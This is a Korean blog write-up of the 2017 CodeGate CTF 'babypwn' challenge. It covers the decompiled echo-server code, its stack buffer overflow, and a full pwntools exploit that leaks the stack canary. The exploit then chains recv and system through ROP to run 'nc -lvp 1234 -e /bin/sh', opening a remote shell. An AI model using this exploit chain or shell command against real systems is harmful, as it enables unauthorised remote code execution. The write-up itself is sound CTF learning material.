---
layout: post
title: "2017 CodeGate babypwn Write up"
excerpt: "Canary&ROP를 공부하기 적합한 문제"
date: 2020-08-17
categories: [system, ctf]
comments: true
---

이번에는 보호기법 중 StackCanary를 우회하여 32bit rop를 하는 문제를 풀어보았다. 

<h3> 0x0. Binary
</h3>

| canary  | fortify  | nx      | pie      | relro   |
| ------- | -------- | ------- | -------- | ------- |
| enabled | disabled | enabled | disabled | partial |



<h3>0x1. main
</h3>
코드의 메인을 확인해보면 그냥 소켓통신을 위한 코드인 것 같다.

```c
unsigned int __cdecl main(int a1, char **a2)
{
  socklen_t addr_len; // [esp+20h] [ebp-30h]
  int optval; // [esp+24h] [ebp-2Ch]
  int v5; // [esp+28h] [ebp-28h]
  struct sockaddr addr; // [esp+2Ch] [ebp-24h]
  struct sockaddr v7; // [esp+3Ch] [ebp-14h]
  unsigned int v8; // [esp+4Ch] [ebp-4h]

  v8 = __readgsdword(0x14u);
  if ( a1 == 2 )
    v5 = atoi(a2[1]);
  else
    v5 = 8181;
  dword_804B1BC = socket(2, 1, 0);
  if ( dword_804B1BC == -1 )
  {
    perror("[!] socket Error!");
    exit(1);
  }
  addr.sa_family = 2;
  *(_WORD *)addr.sa_data = htons(v5);
  *(_DWORD *)&addr.sa_data[2] = 0;
  bzero(&addr.sa_data[6], 8u);
  optval = 1;
  setsockopt(dword_804B1BC, 1, 2, &optval, 4u);
  if ( bind(dword_804B1BC, &addr, 0x10u) == -1 )
  {
    perror("[!] bind Error!");
    exit(1);
  }
  if ( listen(dword_804B1BC, 1024) == -1 )
  {
    perror("[!] listen Error!");
    exit(1);
  }
  while ( 1 )
  {
    while ( 1 )
    {
      addr_len = 16;
      fd = accept(dword_804B1BC, &v7, &addr_len);
      if ( fd != -1 )
        break;
      perror("[!] accept Error!");
    }
    if ( !fork() )
      break;
    close(fd);
    while ( waitpid(-1, 0, 1) > 0 )
      ;
  }
  sub_8048B87();
  close(dword_804B1BC);
  close(fd);
  return __readgsdword(0x14u) ^ v8;
}
```

코드를 확인해보면 특별한 값이 없으면 8181포트를 연결한다. 그럼 이제 sub_8048B87등의 기타 함수를 보자.

사실상 메인으로 보여지는 sub_

```c
unsigned int sub_8048A71()
{
  int v1; // [esp+1Ch] [ebp-3Ch]
  char v2; // [esp+24h] [ebp-34h]
  unsigned int v3; // [esp+4Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  memset(&v2, 0, 0x28u);
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        sub_80488B1("\n===============================\n");
        sub_80488B1("1. Echo\n");
        sub_80488B1("2. Reverse Echo\n");
        sub_80488B1("3. Exit\n");
        sub_80488B1("===============================\n");
        v1 = sub_804895A();
        if ( v1 != 1 )
          break;
        sub_80488B1("Input Your Message : ");
        sub_8048907(&v2, 100);
        sub_80488B1(&v2);
      }
      if ( v1 != 2 )
        break;
      sub_80488B1("Input Your Message : ");
      sub_8048907(&v2, 100);
      sub_80489C8(&v2);
      sub_80488B1(&v2);
    }
    if ( v1 == 3 )
      break;
    sub_80488B1("\n[!] Wrong Input\n");
  }
  return __readgsdword(0x14u) ^ v3;
}
```

를 보면 변수의 메모리는 40인데 입력값을 100을 받는걸 볼 수 있고, 여기서 Bof 취약점이 발생한다.



<h3>0x2 Exploit Vector</h3>

이제는 어떻게 공격을 해보면 좋을지 생각해보자.  일단 Bof를 이용해야 하는데 NX bit가 있으므로 ROP를 이용할거다. 그리고 canary가 있으니 canary leak을 해야한다.

우선 canary값을 leak하는 코드이다 . 40바이트만 찍으면 나와야 하는데 41바이트를 해야 출력되는걸 봐서는 canary의 첫 바이트는 0x00임을 알 수 있다. 

```python
from pwn import *

p = remote('localhost',8181)
e = ELF("./babypwn")

ppppr = 0x08048eec
recv_plt = e.plt['recv']
system_plt = e.plt['system']

cmd = 'nc -lvp 1234 -e /bin/sh'

#stack canary leak
p.sendlineafter('> ','1')
p.sendafter(': ','A'*41)
leak = p.recv(1024)[41:44]
canary = u32('\x00' +leak)
print "[+] Stack Canary Leak :" +hex(canary)


p.close()

p = remote('localhost',8181)

p.sendlineafter('> ','1')

#ROP
pay = 'A'*40
pay +=  p32(canary)
pay += 'A'*12

pay += p32(recv_plt)
pay += p32(ppppr)
pay += p32(4)
pay += p32(e.bss())
pay += p32(len(cmd)+1)
pay += p32(0)

pay += p32(system_plt)
pay += 'A'*4
pay += p32(e.bss())

p.sendlineafter(': ', pay)
p.sendlineafter('> ','3')

sleep(1)

p.sendline(cmd)
```



이 문제는 리버스 커넥션을 이용하여 해결하였다. 거진 두달만에 ctf문제를 풀어보는 것 같은데, 많이 분발해야겠다. 

아직도 카나리를 릭하는걸 잘 못하겠다. + 리버스 커넥션 개념도 이번에 처음 이용해보았는데 좀 더 알고 써야겠다.
